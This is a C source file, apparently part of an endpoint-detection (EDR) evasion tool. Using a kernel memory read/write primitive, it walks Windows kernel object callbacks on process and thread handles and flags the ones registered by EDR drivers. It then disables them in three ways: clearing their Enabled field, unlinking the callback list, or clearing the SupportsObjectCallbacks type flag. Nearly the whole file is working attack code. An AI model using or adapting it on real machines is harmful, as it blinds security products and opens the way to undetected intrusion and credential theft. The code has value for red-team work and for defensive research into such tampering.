#include <Tchar.h>
#include <Windows.h>

#include "IsEDRChecks.h"
#include "PdbSymbols.h"
#include "NtoskrnlOffsets.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "FileVersion.h"
#include "KernelCallbacks.h"
#include "PrintFunctions.h"

#include "ObjectCallbacks.h"


typedef enum OB_OPERATION_e {
    OB_OPERATION_HANDLE_CREATE = 1,
    OB_OPERATION_HANDLE_DUPLICATE = 2,
    OB_FLT_REGISTRATION_VERSION = 0x100
} OB_OPERATION;

typedef struct UNICODE_STRING_t {
    USHORT Length;
    USHORT MaximumLength;
    PWCH Buffer;
} UNICODE_STRING;

#define GET_OFFSET(STRUCTNAME, OFFSETNAME) Offset_ ## STRUCTNAME ## _ ## OFFSETNAME = GetFieldOffset(sym_ctx, #STRUCTNAME, L###OFFSETNAME)
#define GET_SYMBOL(SYMBOL) Sym_ ## SYMBOL = GetSymbolOffset(sym_ctx, #SYMBOL)


typedef struct OB_CALLBACK_t OB_CALLBACK;

typedef PVOID POBJECT_TYPE, POB_PRE_OPERATION_CALLBACK, POB_POST_OPERATION_CALLBACK;
/*
* Internal / undocumented version of OB_OPERATION_REGISTRATION
*/
typedef struct OB_CALLBACK_ENTRY_t {
    LIST_ENTRY CallbackList; // linked element tied to _OBJECT_TYPE.CallbackList
    OB_OPERATION Operations; // bitfield : 1 for Creations, 2 for Duplications
    BOOL Enabled;            // self-explanatory
    OB_CALLBACK* Entry;      // points to the structure in which it is included
    POBJECT_TYPE ObjectType; // points to the object type affected by the callback
    POB_PRE_OPERATION_CALLBACK PreOperation;      // callback function called before each handle operation
    POB_POST_OPERATION_CALLBACK PostOperation;     // callback function called after each handle operation
    KSPIN_LOCK Lock;         // lock object used for synchronization
} OB_CALLBACK_ENTRY;

/*
* A callback entry is made of some fields followed by concatenation of callback entry items, and the buffer of the associated Altitude string
* Internal / undocumented (and compact) version of OB_CALLBACK_REGISTRATION
*/
typedef struct OB_CALLBACK_t {
    USHORT Version;                           // usually 0x100
    USHORT OperationRegistrationCount;        // number of registered callbacks
    PVOID RegistrationContext;                // arbitrary data passed at registration time
    UNICODE_STRING AltitudeString;            // used to determine callbacks order
    struct OB_CALLBACK_ENTRY_t EntryItems[1]; // array of OperationRegistrationCount items
    WCHAR AltitudeBuffer[1];                  // is AltitudeString.MaximumLength bytes long, and pointed by AltitudeString.Buffer
} OB_CALLBACK;


//TODO : find a way to reliably find the offsets
DWORD64 Offset_CALLBACK_ENTRY_ITEM_Operations = offsetof(OB_CALLBACK_ENTRY, Operations); //BOOL
DWORD64 Offset_CALLBACK_ENTRY_ITEM_Enabled = offsetof(OB_CALLBACK_ENTRY, Enabled); //DWORD
DWORD64 Offset_CALLBACK_ENTRY_ITEM_ObjectType = offsetof(OB_CALLBACK_ENTRY, ObjectType); //POBJECT_TYPE
DWORD64 Offset_CALLBACK_ENTRY_ITEM_PreOperation = offsetof(OB_CALLBACK_ENTRY, PreOperation); //POB_PRE_OPERATION_CALLBACK
DWORD64 Offset_CALLBACK_ENTRY_ITEM_PostOperation = offsetof(OB_CALLBACK_ENTRY, PostOperation); //POB_POST_OPERATION_CALLBACK

//TODO : parse the bitfield in the PDB symbols to ensure "SupportsObjectCallbacks" is bit 6
WORD SupportsObjectCallbacks_bit = 0x40;

struct ObjTypeSubjectToCallback {
    TCHAR* name;
    DWORD64 offset;
    DWORD64 callbackListAddress;
    DWORD64 callbackListFlinkBackup;
    DWORD64 callbackListBlinkBackup;
    SIZE_T nbCallbacks;
} ObjectTypesSubjectToCallback[2] = {
    {.name = TEXT("Process"), .offset = 0},
    {.name = TEXT("Thread"), .offset = 0},
};

/*
* Get symbols from Internet that are not in the NtoskrnlOffsets structure (for experimental functions only)
*/
void GetAdditionnalObjectCallbackOffsets() {
    if (Offset__OBJECT_TYPE_Name) {
        //Symbols and offsets already loaded
        return;
    }
    symbol_ctx* sym_ctx = LoadSymbolsFromImageFile(GetNtoskrnlPath());
    if (sym_ctx == NULL) {
        _tprintf_or_not(TEXT("Symbols not downloaded, aborting..."));
        exit(1);
    }
    GET_OFFSET(_OBJECT_TYPE, Name);
    GET_OFFSET(_OBJECT_TYPE, TotalNumberOfObjects);
    GET_OFFSET(_OBJECT_TYPE, TypeInfo);
    GET_OFFSET(_OBJECT_TYPE_INITIALIZER, ObjectTypeFlags);
    GET_SYMBOL(ObpObjectTypes);
    GET_SYMBOL(ObpTypeObjectType);

    UnloadSymbols(sym_ctx, FALSE);
}


/*
* ------- Callback Entry Undocumented structure strategy --------
* The following functions use the fact that the CallbackList of an _OBJECT_TYPE contains a list of _CALLBACK_ENTRY_ITEM elements, _CALLBACK_ENTRY_ITEM being the unofficial name
* of an undocumented structure.
* The struct has been reversed engineered in various ntoskrnl.exe version and seems constant from Windows 10 version 10240 to 22000 (oldest to most recent versions)
*/

/*
* Experimental : enumerates all object types on Windows, and checks if some callbacks are defined, even if not officially supported
*/
void EnumAllObjectsCallbacks() {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return;
    }
    GetAdditionnalObjectCallbackOffsets();

    //get object types count
    DWORD64 ObjectTypeType = ReadKernelMemoryDWORD64(Sym_ObpTypeObjectType);
    DWORD ObjectTypesCount = ReadMemoryDWORD(ObjectTypeType + Offset__OBJECT_TYPE_TotalNumberOfObjects);

    for (DWORD i = 0; i < ObjectTypesCount; i++) {
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(Sym_ObpObjectTypes + i * sizeof(DWORD64));
        DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;
        WORD ObjectType_Name_Length = ReadMemoryWORD(ObjectType + Offset__OBJECT_TYPE_Name + offsetof(UNICODE_STRING, Length));
        DWORD64 ObjectType_Name_Buffer = ReadMemoryDWORD64(ObjectType + Offset__OBJECT_TYPE_Name + offsetof(UNICODE_STRING, Buffer));
        WCHAR typeName[256] = { 0 };
        ReadMemory(ObjectType_Name_Buffer, typeName, ObjectType_Name_Length);
        wprintf_or_not(L"Object type : %s\n", typeName);

        for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List);
            cbEntry != ObjectType_Callbacks_List;
            cbEntry = ReadMemoryDWORD64(cbEntry)) {
            DWORD64 ObjectTypeField = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_ObjectType);
            if (ObjectTypeField != ObjectType) {
                _putts_or_not(TEXT("Unexpected value in callback entry (ObjectTypeField), exiting..."));
                exit(1);
            }
            BOOL Enabled = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled);
            if (Enabled == FALSE) {
                continue;
            }
            if (Enabled != TRUE) {
                _putts_or_not(TEXT("Unexpected value in callback entry (Enabled), exiting..."));
                exit(1);
            }
            OB_OPERATION Operations = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Operations);
            _tprintf_or_not(TEXT("Callback for handle %s%s%s\n"),
                Operations & 1 ? TEXT("creations") : TEXT(""),
                Operations == 3 ? TEXT(" & ") : TEXT(""),
                Operations & 2 ? TEXT("duplications") : TEXT(""));
            DWORD64 PreOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PreOperation);
            DWORD64 PostOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PostOperation);
            DWORD64 driverOffsetPreOperation = 0;
            DWORD64 driverOffsetPostOperation = 0;
            TCHAR* driverNamePreOperation = FindDriverName(PreOperation, &driverOffsetPreOperation);
            TCHAR* driverNamePostOperation = FindDriverName(PostOperation, &driverOffsetPostOperation);
            _tprintf_or_not(TEXT("\tPreoperation at %llx [%s + %llx])\n"), PreOperation, driverNamePreOperation, driverOffsetPreOperation);
            _tprintf_or_not(TEXT("\tPostoperation at %llx [%s + %llx]\n"), PostOperation, driverNamePostOperation, driverOffsetPostOperation);
        }
        _putts_or_not(TEXT(""));

    }
}

/*
* Enumerate all callbacks set on Process & Thread handle manipulation
* WARNING : depends on undocumented structures, but is able to differentiate EDR-related callbacks from potentially legitimate ones
*/
BOOL EnumEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return FALSE;
    }
    BOOL found = FALSE;
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;

    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tEnumerating %s object callbacks : \n"), ObjectTypesSubjectToCallback[i].name);
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
        DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;

        for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List);
            cbEntry != ObjectType_Callbacks_List;
            cbEntry = ReadMemoryDWORD64(cbEntry)) {
            
            DWORD64 ObjectTypeField = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_ObjectType);
            if (ObjectTypeField != ObjectType) {
                _putts_or_not(TEXT("Unexpected value in callback entry (ObjectTypeField), exiting..."));
                exit(1);
            }
            DWORD Operations = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Operations);
            TCHAR* OperationsString;
            switch (Operations) {
            case 1: // OB_OPERATION_HANDLE_CREATE
                OperationsString = TEXT("creations");
                break;
            case 2: // OB_OPERATION_HANDLE_DUPLICATE
                OperationsString = TEXT("duplications");
                break;
            case 3: // OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE 
                OperationsString = TEXT("creations & duplications");
                break;
            default:
                _putts_or_not(TEXT("Unexpected value in callback entry (Operations), exiting..."));
                exit(1);
            }
            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\tCallback at %p for handle %s:\n"), (PVOID)cbEntry, OperationsString);
            BOOL Enabled = ReadMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled);
            if (Enabled != FALSE && Enabled != TRUE) {
                _putts_or_not(TEXT("Unexpected value in callback entry (Enabled), exiting..."));
                exit(1);
            }
            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tStatus: %s\n"), Enabled ? TEXT("Enabled") : TEXT("Disabled"));
            DWORD64 PreOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PreOperation);
            if (PreOperation) {
                DWORD64 driverOffset;
                TCHAR* driverNamePreOperation = FindDriverName(PreOperation, &driverOffset);
                _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tPreoperation at 0x%016llx [%s + 0x%llx]\n"), PreOperation, driverNamePreOperation, driverOffset);
                if (isDriverNameMatchingEDR(driverNamePreOperation)) {
                    _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tCallback belongs to an EDR "));
                    if (Enabled) {
                        _putts_or_not(TEXT("and is enabled!"));
                        struct KRNL_CALLBACK cb;
                        cb.type = OBJECT_CALLBACK;
                        cb.driver_name = driverNamePreOperation;
                        cb.removed = FALSE;
                        cb.callback_func = PreOperation;
                        cb.addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
                        AddFoundKernelCallback(FoundObjectCallbacks, &cb);
                        found |= TRUE;
                    }
                    else {
                        _putts_or_not(TEXT("but is disabled."));

                    }
                }
            }
            DWORD64 PostOperation = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_PostOperation);
            if (PostOperation) {
                DWORD64 driverOffset;
                TCHAR* driverNamePostOperation = FindDriverName(PostOperation, &driverOffset);
                _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tPostoperation at 0x%016llx [%s + 0x%llx]\n"), PostOperation, driverNamePostOperation, driverOffset);
                if (Enabled && isDriverNameMatchingEDR(driverNamePostOperation)) {
                    _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t\t\tCallback belongs to an EDR "));
                    if (Enabled) {
                        _putts_or_not(TEXT("and is enabled!"));
                        if (FoundObjectCallbacks->size != 0 &&
                            FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->size - 1].type == OBJECT_CALLBACK &&
                            FoundObjectCallbacks->EDR_CALLBACKS[FoundObjectCallbacks->size - 1].addresses.object_callback.enable_addr == cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled) {
                            //skip if last callback function belong to the same callback entry (preoperation)
                            continue;
                        }
                        struct KRNL_CALLBACK cb;
                        cb.type = OBJECT_CALLBACK;
                        cb.driver_name = driverNamePostOperation;
                        cb.removed = FALSE;
                        cb.callback_func = PostOperation;
                        cb.addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
                        AddFoundKernelCallback(FoundObjectCallbacks, &cb);
                        found |= TRUE;
                    }
                    else {
                        _putts_or_not(TEXT("but is disabled."));
                    }
                }
            }
        }
    }
    return found;
}


void EnableDisableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks, BOOL enable) {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return;
    }
    for (DWORD64 i = 0; i < FoundObjectCallbacks->size; i++) {
        struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[i];
        if (cb->type == OBJECT_CALLBACK && cb->removed == enable) {
            _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t%s %s callback...\n"), enable ? TEXT("Enabling") : TEXT("Disabling"), cb->driver_name);
            WriteMemoryDWORD(cb->addresses.object_callback.enable_addr, enable ? TRUE : FALSE);
            cb->removed = !cb->removed;
        }
    }
}

void DisableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
    EnableDisableEDRProcessAndThreadObjectsCallbacks(FoundObjectCallbacks, FALSE);
}

void EnableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundObjectCallbacks) {
    EnableDisableEDRProcessAndThreadObjectsCallbacks(FoundObjectCallbacks, TRUE);
}

void EnableDisableAllProcessAndThreadObjectsCallbacks(BOOL enable) {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return;
    }
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;
    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
        DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;

        for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List);
            cbEntry != ObjectType_Callbacks_List;
            cbEntry = ReadMemoryDWORD64(cbEntry)) {
            DWORD64 ObjectTypeField = ReadMemoryDWORD64(cbEntry + Offset_CALLBACK_ENTRY_ITEM_ObjectType);
            if (ObjectTypeField != ObjectType) {
                _putts_or_not(TEXT("Unexpected value in callback entry, exiting..."));
                exit(1);
            }
            WriteMemoryDWORD(cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled, enable ? TRUE : FALSE);
        }
    }
}


/*
* ------- CallbackList unlinking strategy --------
* The following functions use the fact that the CallbackList of an _OBJECT_TYPE can be emptied by making it point to itself
* However, if the kernel memory write primitive used to overwrite a pointer is not "atomic" (e.g. the RTCore64 driver's writes 2 DWORDs successively), there
* is a high risk of race condition where the CallbackList is used by the system while one of its pointers is only partial overwritten (thus invalid), which
* is likely to result in a crash.
* Handle creation/duplication for processes and threads being very frequent, this strategy is thus risky in some cases.
*/

/*
* Count callbacks set on Process & Thread handle manipulation, but is unnable to differentiate EDR-related callbacks from potentially legitimate ones
* Depends only on documented symbols
*/
SIZE_T CountProcessAndThreadObjectsCallbacks() {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return 0;
    }
    SIZE_T nbCallbacks = 0;
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;
    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
        DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;

        for (DWORD64 cbEntry = ReadMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Flink));
            cbEntry != ObjectType_Callbacks_List;
            cbEntry = ReadMemoryDWORD64(cbEntry + offsetof(LIST_ENTRY, Flink))) {
            nbCallbacks++;
            ObjectTypesSubjectToCallback[i].nbCallbacks++;
        }
        _tprintf_or_not(TEXT("Counting %llu registered callbacks for %s\n"), ObjectTypesSubjectToCallback[i].nbCallbacks, ObjectTypesSubjectToCallback[i].name);
    }

    return nbCallbacks;
}

/*
* Unlink all process and thread handle callbacks (EDR related or not)
* (no critical system component should be in these list anyway)
*/
void RemoveAllProcessAndThreadObjectsCallbacks() {
    if (!NtoskrnlObjectCallbackOffsetsArePresent()) {
        _putts_or_not(TEXT("Object callback offsets not loaded ! Aborting..."));
        return;
    }
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;
    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        if (ObjectTypesSubjectToCallback[i].nbCallbacks) {
            DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
            DWORD64 ObjectType_Callbacks_List = ObjectType + g_ntoskrnlOffsets.st.object_type_callbacklist;
            ObjectTypesSubjectToCallback[i].callbackListAddress = ObjectType_Callbacks_List;

            ObjectTypesSubjectToCallback[i].callbackListFlinkBackup = ReadMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Flink));
            ObjectTypesSubjectToCallback[i].callbackListBlinkBackup = ReadMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Blink));
            WriteMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Flink), ObjectType_Callbacks_List);
            WriteMemoryDWORD64(ObjectType_Callbacks_List + offsetof(LIST_ENTRY, Blink), ObjectType_Callbacks_List);
            _tprintf_or_not(TEXT("Unlinked the callback entries for %s\n"), ObjectTypesSubjectToCallback[i].name);
        }

    }
    _putts_or_not(TEXT(""));
}

/*
* Re-link all process and thread handle callbacks that were unlinked
*/
void RestoreAllProcessAndThreadObjectsCallbacks() {
    GetAdditionnalObjectCallbackOffsets();
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;

    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        if (ObjectTypesSubjectToCallback[i].callbackListAddress && ObjectTypesSubjectToCallback[i].nbCallbacks) {
            DWORD64 callbackListAddress = ObjectTypesSubjectToCallback[i].callbackListAddress;
            WriteMemoryDWORD64(callbackListAddress + offsetof(LIST_ENTRY, Flink), ObjectTypesSubjectToCallback[i].callbackListFlinkBackup);
            WriteMemoryDWORD64(callbackListAddress + offsetof(LIST_ENTRY, Blink), ObjectTypesSubjectToCallback[i].callbackListBlinkBackup);
            _tprintf_or_not(TEXT("Re-linked the original callback entries for %s\n"), ObjectTypesSubjectToCallback[i].name);
        }
    }
    _putts_or_not(TEXT(""));
}

/*
* ------- CallbackList unlinking strategy END --------
*/


/*
* ------- SupportCallbacks bit strategy --------
*/
/*
* Enables/Disables Callback support for processes and threads entirely. The "SupportsObjectCallbacks" field of _OBJECT_TYPE being checked by ObpCreateHandle before checking if CallbackList
* is not empty (and before listing & calling the callbacks). No callback support, no callbacks.
* WARNING : This flag is actually checked by PatchGuard ! There is a risk that PatchGuard will notice a change, even if temporary, and cause a BSOD.
*/
void EnableDisableProcessAndThreadObjectsCallbacksSupport(BOOL enable) {
    GetAdditionnalObjectCallbackOffsets();

    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;

    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        DWORD64 ObjectType = ReadKernelMemoryDWORD64(ObjectTypesSubjectToCallback[i].offset);
        DWORD64 ObjectType_TypeInfo = ObjectType + Offset__OBJECT_TYPE_TypeInfo;
        WORD TypeInfo_ObjectTypeFlags = ReadMemoryWORD(ObjectType_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_ObjectTypeFlags);
        if (enable) {
            TypeInfo_ObjectTypeFlags |= SupportsObjectCallbacks_bit;
        }
        else {
            TypeInfo_ObjectTypeFlags &= ~SupportsObjectCallbacks_bit;
        }
        WriteMemoryWORD(ObjectType_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_ObjectTypeFlags, TypeInfo_ObjectTypeFlags);
        _tprintf_or_not(TEXT("[+] Callback support for %s has been %s\n"), ObjectTypesSubjectToCallback[i].name, enable ? TEXT("enabled") : TEXT("disabled"));

    }
    _putts_or_not(TEXT(""));
}

BOOL AreObjectsCallbacksSupportEnabled(struct ObjTypeSubjectToCallback objTypSubjCb) {
    GetAdditionnalObjectCallbackOffsets();

    DWORD64 ObjectType = ReadKernelMemoryDWORD64(objTypSubjCb.offset);
    DWORD64 ObjectType_TypeInfo = ObjectType + Offset__OBJECT_TYPE_TypeInfo;
    WORD TypeInfo_ObjectTypeFlags = ReadMemoryWORD(ObjectType_TypeInfo + Offset__OBJECT_TYPE_INITIALIZER_ObjectTypeFlags);
    BOOL enable = (TypeInfo_ObjectTypeFlags & SupportsObjectCallbacks_bit) != 0;
    _tprintf_or_not(TEXT("[+] Callback support for %s is %s\n"), objTypSubjCb.name, enable ? TEXT("enabled") : TEXT("disabled"));

    return enable;
}

BOOL AreProcessAndThreadsObjectsCallbacksSupportEnabled() {
    BOOL enabled = FALSE;
    ObjectTypesSubjectToCallback[0].offset = g_ntoskrnlOffsets.st.psProcessType;
    ObjectTypesSubjectToCallback[1].offset = g_ntoskrnlOffsets.st.psThreadType;
    for (DWORD i = 0; i < _countof(ObjectTypesSubjectToCallback); i++) {
        enabled |= AreObjectsCallbacksSupportEnabled(ObjectTypesSubjectToCallback[i]);
    }
    return enabled;
}
/*
* ------- SupportCallbacks bit strategy --------
*/
